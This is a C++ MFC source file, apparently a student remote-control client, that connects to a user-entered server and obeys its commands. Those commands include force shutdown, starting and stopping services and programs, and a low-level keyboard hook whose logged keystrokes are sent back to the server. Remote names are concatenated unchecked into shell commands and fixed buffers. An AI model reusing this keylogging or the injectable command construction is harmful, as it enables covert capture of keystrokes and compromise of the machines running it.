
// ClientDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "ClientDlg.h"
#include "afxdialogex.h"
#include <iostream>
#include "afxcmn.h"
#include <Windows.h>
#include <thread>

#include "Hook.h"


#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// CClientDlg dialog

int CClientDlg::_flag = 1;

CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_CLIENT_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CClientDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_TXT_ID, ID_ADDR);
	DDX_Control(pDX, IDC_BTN_CONNECT, CONNECT);
}

BEGIN_MESSAGE_MAP(CClientDlg, CDialogEx)
	ON_MESSAGE(WM_KEYINPUT, OnHookLowKeyboard)
	ON_MESSAGE(WM_SOCKET, SockMsg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BTN_CONNECT, &CClientDlg::OnBnClickedBtnConnect)
END_MESSAGE_MAP()


// CClientDlg message handlers

BOOL CClientDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	// TODO: Add extra initialization here

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CClientDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CClientDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

// The system calls this function to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CClientDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



LRESULT CClientDlg::SockMsg(WPARAM wParam, LPARAM lParam)
{

	if (WSAGETSELECTERROR(lParam))
	{
		// Display the error and close the socket
		closesocket(wParam);
	}
	switch (WSAGETSELECTEVENT(lParam))
	{
		case FD_READ:
		{
			
			char *mess = new char[100];
			int len = _client.Receive(mess, 16, 0);
			mess[len] = '\0';
			if (strcmp(mess,"Shutdownxxxxxxxx") == 0)
				Shutdown();
			else if (strcmp(mess, "Service_Displayx") == 0)
				Service_Display();
			else if (strcmp(mess, "Service_Startxxx") == 0)
			{
				_name = new char[100];
				len = _client.Receive(_name, 100, 0);
				_name[len] = '\0';
				Service_Start();
			}
			else if (strcmp(mess, "Service_Closexxx") == 0)
			{
				_name = new char[100];
				len = _client.Receive(_name, 100, 0);
				_name[len] = '\0';
				Service_Close();
			}
			else if (strcmp(mess, "ApplicationStart") == 0)
			{
				_name = new char[100];
				len = _client.Receive(_name, 100, 0);
				_name[len] = '\0';
				Application_Start();
			}
			else if (strcmp(mess, "ApplicationClose") == 0)
			{
				_name = new char[100];
				len = _client.Receive(_name, 100, 0);
				_name[len] = '\0';
				Application_Close();
			}
			else if (strcmp(mess, "Set_Hook_Message") == 0)
			{
				SetHookMessage();
			}
			else if (strcmp(mess, "UnSetHookMessage") == 0)
			{
				UnsetHookMessage();
			}
			break;
		}
		case FD_CLOSE:
		{
			_client.Close();
			GetDlgItem(IDC_BTN_CONNECT)->SetWindowText(L"Kết nối");
			break;
		}

	}
	return 0;
}



LONG_PTR CClientDlg::OnHookLowKeyboard(WPARAM wParam, LPARAM lParam)
{
	CString str;
	// Convert the virtual key code into a scancode (as required by GetKeyNameText).
	UINT scanCode = MapVirtualKeyEx(wParam, 0, GetKeyboardLayout(0));
	switch (wParam)
	{
	case VK_INSERT:
	case VK_DELETE:
	case VK_HOME:
	case VK_END:
	case VK_NEXT:  // Page down
	case VK_PRIOR: // Page up
	case VK_LEFT:
	case VK_RIGHT:
	case VK_UP:
	case VK_DOWN:
		scanCode |= 0x100; // Add extended bit
		break;
	}

	// GetKeyNameText() expects the scan code to be on the same format as WM_KEYDOWN
	GetKeyNameText(scanCode << 16, str.GetBuffer(80), 80);
	str.ReleaseBuffer();

	CString strItem(L"Keyboard input:" + str + L"\r\n");

	_hookText += strItem;

	return 0;
}

void CClientDlg::SetHookMessage()
{
	_hookText = L"";
	SetLowKeyboardHook(TRUE, 0, m_hWnd);
}

void CClientDlg::UnsetHookMessage()
{
	SetLowKeyboardHook(FALSE);
	CT2CA hookText(_hookText);
	_client.Send(hookText, strlen(hookText), 0);
}

void CClientDlg::Shutdown()
{
	system("shutdown -s -f -t 00");
}

std::string CClientDlg::exec(const char* cmd)
{
	char buffer[128];
	std::string result = "";
	std::shared_ptr<FILE> pipe(_popen(cmd, "r"), _pclose);
	if (!pipe) throw std::runtime_error("popen() failed!");
	while (!feof(pipe.get())) {
		if (fgets(buffer, 128, pipe.get()) != NULL)
			result += buffer;
	}
	return result;
}

void CClientDlg::Service_Display()
{
	std::string result = exec("net start");
	CString s;
	s.Format(_T("%S"), result.c_str());
	LPCTSTR a = s.operator LPCWSTR();
	_client.Send(result.c_str(), result.length(), 0);
}

void CClientDlg::Service_Start()
{
	char *cmp = new char[100];
	strcpy(cmp, "net start \"");
	strcat(cmp, _name);
	strcat(cmp, "\"");
	std::string result = exec(cmp);
	/*if (strstr(result.c_str(), "starting") == NULL)
		_client.Send("er", 2, 0);
	else
		_client.Send("ok", 2, 0);*/

	delete[] cmp;
	delete[] _name;
	_name = NULL;
}

void CClientDlg::Service_Close()
{
	_flag = 2;
	while (_name[0] == ' ')
	{
		for (int i = 0; i < strlen(_name); i++)
			_name[i] = _name[i + 1];
	}
	char *cmp = new char[100];
	strcpy(cmp, "net stop \"");
	strcat(cmp, _name);
	strcat(cmp, "\" /Y");
	std::string result = exec(cmp);
	//if (strstr(result.c_str(), "invalid") == NULL)
	//	_client.Send("ok", 2, 0);
	//else
	//	_client.Send("er", 2, 0);

	delete[]cmp;
	delete[]_name;
	_name = NULL;
}

void CClientDlg::Application_Start()
{
	char *cmd = new char[100];

	strcat(_name, ".exe");

	strcpy(cmd, "start ");
	strcat(cmd, _name);

	std::string result = exec(cmd);
	delete[] cmd;
	delete[] _name;
	_name = NULL;
}

void CClientDlg::Application_Close()
{
	char *cmd = new char[100];

	strcat(_name, ".exe");

	strcpy(cmd, "start ");
	strcat(cmd, _name);

	

	strcpy(cmd, "taskkill \/im \"");
	strcat(cmd, _name);
	strcat(cmd, "\" /f");
	std::string result = exec(cmd);
	delete[] cmd;
	delete[] _name;
	_name = NULL;
}


void CClientDlg::OnBnClickedBtnConnect()
{	
	// TODO: Add your control notification handler code here
	CString cstr;
	GetDlgItem(IDC_BTN_CONNECT)->GetWindowText(cstr);
	if (cstr == L"Kết nối")
	{
		GetDlgItem(IDC_BTN_CONNECT)->SetWindowText(L"Đóng kết nối");
		UpdateData(TRUE);

		AfxSocketInit(NULL);
		_client.Create();
		CString ipStr;
		ID_ADDR.GetWindowText(ipStr);

		int err = _client.Connect(ipStr.operator LPCWSTR(), 1828);
		if (err == SOCKET_ERROR)
		{
			MessageBox(_T("Ket noi that bai"), _T("ERROR"), 0);
			GetDlgItem(IDC_BTN_CONNECT)->SetWindowText(L"Kết nối");
			return;
		}
		err = WSAAsyncSelect(_client, m_hWnd, WM_SOCKET, FD_READ | FD_CLOSE);
		if (err)
			MessageBox((LPCTSTR)"Cant call WSAAsyncSelect");
	}
	else if (cstr == L"Đóng kết nối")
	{
		_client.Close();
		GetDlgItem(IDC_BTN_CONNECT)->SetWindowText(L"Kết nối");
	}
}

